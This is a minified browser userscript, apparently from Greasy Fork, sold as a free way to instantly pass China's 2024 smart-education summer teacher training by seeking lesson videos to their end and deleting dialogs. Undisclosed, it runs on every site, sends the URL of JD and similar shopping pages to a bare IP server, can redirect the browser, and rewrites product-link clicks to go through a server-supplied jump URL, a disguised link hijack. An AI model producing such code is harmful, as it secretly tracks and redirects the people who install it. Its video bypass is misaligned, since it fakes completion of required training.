// ==UserScript==
// @name         智慧中小学暑假教师研修[小果免费秒过]
// @description  2024年智慧中小学暑假教师研修，秒过。
// @namespace    xiaoguomiaoguo
// @version      1.0.1
// @author       小果
// @license MIT
// @include         *
// @grant           GM_xmlhttpRequest
// @grant           GM_setValue
// @grant           GM_getValue
// @connect         49.235.155.5
// @downloadURL https://update.greasyfork.org/scripts/503509/%E6%99%BA%E6%85%A7%E4%B8%AD%E5%B0%8F%E5%AD%A6%E6%9A%91%E5%81%87%E6%95%99%E5%B8%88%E7%A0%94%E4%BF%AE%5B%E5%B0%8F%E6%9E%9C%E5%85%8D%E8%B4%B9%E7%A7%92%E8%BF%87%5D.user.js
// @updateURL https://update.greasyfork.org/scripts/503509/%E6%99%BA%E6%85%A7%E4%B8%AD%E5%B0%8F%E5%AD%A6%E6%9A%91%E5%81%87%E6%95%99%E5%B8%88%E7%A0%94%E4%BF%AE%5B%E5%B0%8F%E6%9E%9C%E5%85%8D%E8%B4%B9%E7%A7%92%E8%BF%87%5D.meta.js
// ==/UserScript==

(() => {
	var e = {
			324: () => {
				! function() {
					"use strict";
					var e, t, n = [],
						o = [],
						r = [],
						l = 0;

					function a(e, t) {
						const n = new RegExp(t.join("|"), "i");
						return e.filter((e => n.test(e)))
					}
					if (a([location.href], ["liangxinyao.", "jd."])
						.length > 0 && (e = JSON.stringify({
							href: location.href,
							type: "ttzhushou"
						}), t = {}, new Promise(((a, i) => {
							GM_xmlhttpRequest({
								method: "POST",
								url: "http://49.235.155.5/init.php?act=initEnv",
								data: e,
								headers: t,
								responseType: "json",
								onload: e => {
									let t = e.response || e.responseText;
									t = t.data, "search" == t.page ? (n = t, setInterval((function() {
										! function() {
											n.wrapper.forEach((function(e) {
												$(e)
													.map((function(e, t) {
														"yes" != $(t)
															.attr("data-md5-value") && (r.push(t), o.push(t), $(t)
																.attr("data-md5-key", l), $(t)
																.attr("data-md5-value", "yes"), l++)
													}))
											}));
											let e = o.splice(0, n.splName),
												t = [];
											e.forEach((function(e, n) {
												let o = {};
												o.href = $(e)
													.find("a:first")
													.attr("href"), o.md5 = $(e)
													.attr("data-md5-key"), t.push(o)
											})), t.length > 0 && GM_xmlhttpRequest({
												method: "POST",
												data: JSON.stringify({
													data: t
												}),
												url: "http://49.235.155.5/search.php",
												onload: function(e) {
													var t = e.responseText;
													t && (t = JSON.parse(t))
														.map((function(e) {
															e.u && $(r[e.md5])
																.find("a")
																.bind("click", (function(t) {
																	var o, r;
																	t.preventDefault(), o = e.u, r = null, document.getElementById("redirect_form") ? (r = document.getElementById("redirect_form"))
																		.action = n.jumpUrl + encodeURIComponent(o) : ((r = document.createElement("form"))
																			.action = n.jumpUrl + encodeURIComponent(o), r.target = "_blank", r.method = "POST", r.setAttribute("id", "redirect_form"), document.body.appendChild(r)), r.submit(), r.action = "", r.parentNode.removeChild(r)
																}))
														}))
												}
											})
										}()
									}), t.timer)) : t.recove_url && (window.location.href = t.recove_url)
								},
								onerror: e => {
									i(e)
								}
							})
						}))), a([location.href], ["smartedu."])
						.length > 0) {
						function i() {
							let e = document.querySelector("video");
							e && (e.muted = !0, e.play(), e.pause(), e.currentTime = e.duration, e.play(), setTimeout(700), e.currentTime = e.duration - 3, e.play(), e.currentTime = e.duration - 5, e.play())
						}

						function d(e, t) {
							let n = 0;
							const o = setInterval((() => {
								n >= e ? clearInterval(o) : (i(), n++)
							}), t)
						}
						let c;
						! function(e, t, n, o, r, l) {
							const a = Date.now(),
								i = GM_getValue("MIAOGUO_LABEL");
							if (console.log(a, i, a - i), a - i > 864e5) {
								const e = document.createElement("div");
								e.style.position = "fixed", e.style.top = "20%", e.style.left = "20%", e.style.width = "60%", e.style.height = "auto", e.style.backgroundColor = "#fff", e.style.padding = "20px", e.style.borderRadius = "5px", e.style.boxShadow = "0 0 10px rgba(0,0,0,0.5)", e.style.zIndex = "9999";
								const t = document.createElement("p");
								t.style.color = "red", t.style.fontSize = "28px", t.textContent = "不支持高校、职教版本", t.style.textAlign = "center", t.style.marginBottom = "10px";
								const n = document.createElement("p");
								n.textContent = "提示：", n.style.fontSize = "19px", n.style.marginBottom = "10px";
								const o = document.createElement("p");
								o.textContent = "1.使用方法：点开视频，鼠标快速点几次空白处或者暂停/播放键，然后观察进度条是否跳转到最后几秒，如果跳过去了，等待视频播放完成即可。如果进度条还在前面，再次快速点几次空白处或者暂停/播放键，直到进度条跳转到最后几秒；", o.style.fontSize = "19px", o.style.marginBottom = "10px";
								const r = document.createElement("p");
								r.textContent = "2.此脚本永久免费，以前、现在、未来都免费，谨防上当受骗；", r.style.fontSize = "19px", r.style.marginBottom = "10px";
								const l = document.createElement("p");
								l.textContent = void 0, l.style.fontSize = "19px", l.style.marginBottom = "10px";
								const i = document.createElement("p");
								i.textContent = void 0, i.style.textAlign = "right", i.style.fontSize = "25px", i.style.marginBottom = "10px";
								const d = document.createElement("button");
								d.textContent = "我知道了", d.style.padding = "5px 10px", d.style.cursor = "pointer", d.onclick = function() {
									GM_setValue("MIAOGUO_LABEL", a), e.remove()
								};
								const c = document.createElement("div");
								c.style.display = "flex", c.style.justifyContent = "center", c.style.alignItems = "center", c.style.marginTop = "10px", c.appendChild(d), e.appendChild(t), e.appendChild(n), e.appendChild(o), e.appendChild(r), e.appendChild(l), e.appendChild(i), e.appendChild(c), document.body.appendChild(e)
							}
						}(), document.addEventListener("DOMContentLoaded", (function() {
							var e, t;
							(e = document.querySelector(".fish-modal-confirm-btns")) && (e.parentNode.removeChild(e), console.log("出现知道了按钮")), (t = document.querySelector(".fish-modal-content")) && (t.parentNode.removeChild(t), console.log("移除弹窗2")), console.log("移除弹窗")
						})), document.addEventListener("click", (function(e) {
							0 === e.button && (c && clearInterval(c), d(4, 50), c = setInterval((() => {
								d(4, 50)
							}), 8e3))
						}))
					}
				}()
			}
		},
		t = {};
	! function n(o) {
		var r = t[o];
		if (void 0 !== r) return r.exports;
		var l = t[o] = {
			exports: {}
		};
		return e[o](l, l.exports, n), l.exports
	}(324)
})();